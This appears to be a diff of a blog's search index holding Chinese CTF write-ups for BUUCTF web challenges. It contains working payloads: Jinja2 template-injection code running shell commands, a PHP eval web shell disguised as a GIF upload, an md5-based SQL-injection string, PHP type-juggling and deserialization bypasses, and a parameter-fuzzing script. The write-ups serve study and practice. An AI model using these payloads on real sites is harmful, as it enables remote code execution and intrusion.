+<p>等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数</p>
+</blockquote>
+<h3 id="md5-bypass"><a href="#md5-bypass" class="headerlink" title="md5 bypass"></a>md5 bypass</h3><blockquote>
+<p>md5()或者sha1()之类的函数计算的是一个字符串的哈希值，对于数组则返回false，如果$a和$b都是数组则双双返回FALSE, 两个FALSE相等得以绕过</p>
+</blockquote>
+<h2 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h2><p>一通乱试看到页面注释有<code>&lt;!--ssssssti &amp; a little trick --&gt;</code></p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls &#x2F;&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<p>找到flag位置</p>
+<p>paylaod</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<p>回显flag</p>
+]]></content>
+      <categories>
+        <category>BUUCTF</category>
+      </categories>
+      <tags>
+        <tag>CTF - Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week20200907-20200913</title>
+    <url>/2020/09/10/week20200907-20200913/</url>
+    <content><![CDATA[<h1 id="Week-6-lt-2020-09-07-2020-09-13-gt"><a href="#Week-6-lt-2020-09-07-2020-09-13-gt" class="headerlink" title="Week 6 &lt;2020.09.07 - 2020.09.13&gt;"></a>Week 6 &lt;2020.09.07 - 2020.09.13&gt;</h1><a id="more"></a>
+
+<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>利用.git源码泄露</p>
+<p>源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h2><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2>]]></content>
+      <categories>
+        <category>BUUCTF</category>
+      </categories>
+      <tags>
+        <tag>CTF - Web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>week20200831-20200906</title>
     <url>/2020/09/10/week20200831-20200906/</url>
     <content><![CDATA[<h1 id="Week-5-lt-2020-08-31-2020-09-06-gt"><a href="#Week-5-lt-2020-08-31-2020-09-06-gt" class="headerlink" title="Week 5 &lt;2020.08.31 - 2020.09.06&gt;"></a>Week 5 &lt;2020.08.31 - 2020.09.06&gt;</h1><a id="more"></a>
@@ -777,79 +950,6 @@ password栏：123456</code><br><strong>ag{369a193d-5981-4b62-8ead-daebdcdf79a3}<
       </tags>
   </entry>
   <entry>
-    <title>week20200803-20200809</title>
-    <url>/2020/08/06/week20200803-20200809/</url>
-    <content><![CDATA[<h1 id="Week-4-lt-2020-08-03-2020-08-09-gt"><a href="#Week-4-lt-2020-08-03-2020-08-09-gt" class="headerlink" title="Week 4&lt;2020.08.03 - 2020.08.09&gt;"></a>Week 4&lt;2020.08.03 - 2020.08.09&gt;</h1><a id="more"></a>
-
-<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>网页给出提示<strong>Try to find out source file!</strong><br>访问备份文件：/index.php.bak<br>源代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>即：<br>以GET方式传参，key值等于”123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3”（字符串）<br>key值要求为数字</p>
-<p>考点：</p>
-<blockquote>
-<p>PHP的弱类型特性，int和string是无法直接比较的，php会将string转换成int然后再进行比较，转换成int比较时只保留数字，第一个字符串之后的所有内容会被截掉</p>
-</blockquote>
-<p>payload: /?key=123</p>
-<p>flag{32bbbcc8-df1b-419c-b0f7-fc8fe3bd9e48}</p>
-<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>查看源代码，/pay.php</p>
-<p>网页源代码注意到：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">	$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">	<span class="keyword">if</span> (is_numeric($password)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"password can't be number&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> ($password == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Password Right!&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>burpsuite拦截：<br><img src="/2020/08/06/week20200803-20200809/image-20200806022344298.png" alt="image-20200806022344298"></p>
-<p>repeater：</p>
-<p><img src="/2020/08/06/week20200803-20200809/image-20200806025631219.png" alt="image-20200806025631219"></p>
-<p>绕过<code>is_numeric()</code>的方法：</p>
-<blockquote>
-<p><strong>php中的is_numeric()漏洞</strong><br>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！</p>
-</blockquote>
-<p><img src="/2020/08/06/week20200803-20200809/image-20200806025600159.png" alt="image-20200806025600159"></p>
-<p>提示 <strong>Flag need your 100000000 money</strong></p>
-<p><img src="/2020/08/06/week20200803-20200809/image-20200806025538945.png" alt="image-20200806025538945"></p>
-<p>注：这里也可以用科学计数法绕过<br><img src="/2020/08/06/week20200803-20200809/image-20200806025510788.png" alt="image-20200806025510788"></p>
-<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>随便上传一个文件</p>
-<p>报错：</p>
-<p><img src="/2020/08/06/week20200803-20200809/image-20200810024847689.png" alt="image-20200810024847689"></p>
-<p>抓包，修改后缀为.phtml，内容是</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'php'</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="string">'ye'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>上传成功</p>
-<p><img src="/2020/08/06/week20200803-20200809/image-20200810025324304.png" alt="image-20200810025324304"></p>
-<p>蚁剑连接，在根目录下找到flag</p>
-<p><img src="/2020/08/06/week20200803-20200809/image-20200810025309017.png" alt="image-20200810025309017"></p>
-<p>flag{9b3cc74d-daad-4ad2-a788-82c9d0c3ec16}</p>
-<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>网页代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;	</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>payload:<br><a href="http://0c868115-eafc-49ed-8f9c-279c0a0dc9ec.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D" target="_blank" rel="noopener">http://0c868115-eafc-49ed-8f9c-279c0a0dc9ec.node3.buuoj.cn/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:%22Flag%22:1:%7Bs:4:%22file%22;s:8:%22flag.php%22;%7D</a></p>
-<p>flag{77a1ae97-c1ad-44d3-b1e0-99c77f190391}</p>
-<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>利用脚本寻找利用点</p>
-<p>分析脚本（转载<a href="https://blog.csdn.net/a3320315/article/details/102945940）" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/102945940）</a></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(<span class="string">'开始时间：  '</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)  							  		<span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r"D:/soft/phpstudy/PHPTutorial/WWW/src/"</span></span><br><span class="line">os.chdir(filePath)											<span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>						<span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>										<span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span><span class="params">(file)</span>:</span></span><br><span class="line">    s1.acquire()												</span><br><span class="line">    print(<span class="string">'trying   '</span>+file+ <span class="string">'     '</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> open(file,encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:							<span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = list(re.findall(<span class="string">'\$_GET\[\'(.*?)\'\]'</span>, f.read()))</span><br><span class="line">            posts = list(re.findall(<span class="string">'\$_POST\[\'(.*?)\'\]'</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;														<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;														<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">"echo 'xxxxxx';"</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">"echo 'xxxxxx';"</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1/src/'</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)		<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()											<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:						<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">'?%s='</span>%a+<span class="string">"echo 'xxxxxx';"</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()							<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">"echo 'xxxxxx';"</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()						<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">"xxxxxx"</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:							<span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">'找到了利用文件： '</span>+file+<span class="string">"  and 找到了利用的参数：%s"</span> %param)</span><br><span class="line">        print(<span class="string">'结束时间：  '</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:													<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>
-
-<p>payload<br><code>/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</code></p>
-<p><strong>flag{9b7d075f-096d-42b2-8cf6-69d0fbf34c12}</strong></p>
-<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>考点：</p>
-<h3 id="password-’”-md5-pass-true-”‘"><a href="#password-’”-md5-pass-true-”‘" class="headerlink" title="password=’”.md5($pass,true).”‘"></a>password=’”.md5($pass,true).”‘</h3><blockquote>
-<p>ffifdyop，这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，<br>而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是1select * from ‘admin’ where password=’’ or ‘6xxxxx’</p>
-<p>等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数</p>
-</blockquote>
-<h3 id="md5-bypass"><a href="#md5-bypass" class="headerlink" title="md5 bypass"></a>md5 bypass</h3><blockquote>
-<p>md5()或者sha1()之类的函数计算的是一个字符串的哈希值，对于数组则返回false，如果$a和$b都是数组则双双返回FALSE, 两个FALSE相等得以绕过</p>
-</blockquote>
-<h2 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h2><p>一通乱试看到页面注释有<code>&lt;!--ssssssti &amp; a little trick --&gt;</code></p>
-<p>payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls &#x2F;&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-<p>找到flag位置</p>
-<p>paylaod</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flag&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-<p>回显flag</p>
-]]></content>
-      <categories>
-        <category>BUUCTF</category>
-      </categories>
-      <tags>
-        <tag>CTF - Web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>[安洵杯 2019]game WriteUp</title>
     <url>/2020/09/13/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-game-WriteUp/</url>
     <content><![CDATA[<hr>
@@ -878,27 +978,6 @@ password栏：123456</code><br><strong>ag{369a193d-5981-4b62-8ead-daebdcdf79a3}<
       </categories>
       <tags>
         <tag>CTF - Re</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>week20200907-20200913</title>
-    <url>/2020/09/10/week20200907-20200913/</url>
-    <content><![CDATA[<h1 id="Week-6-lt-2020-09-07-2020-09-13-gt"><a href="#Week-6-lt-2020-09-07-2020-09-13-gt" class="headerlink" title="Week 6 &lt;2020.09.07 - 2020.09.13&gt;"></a>Week 6 &lt;2020.09.07 - 2020.09.13&gt;</h1><a id="more"></a>
-
-<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>利用.git源码泄露</p>
-<p>源码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h2><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2>]]></content>
-      <categories>
-        <category>BUUCTF</category>
-      </categories>
-      <tags>
-        <tag>CTF - Web</tag>
       </tags>
   </entry>
 </search>
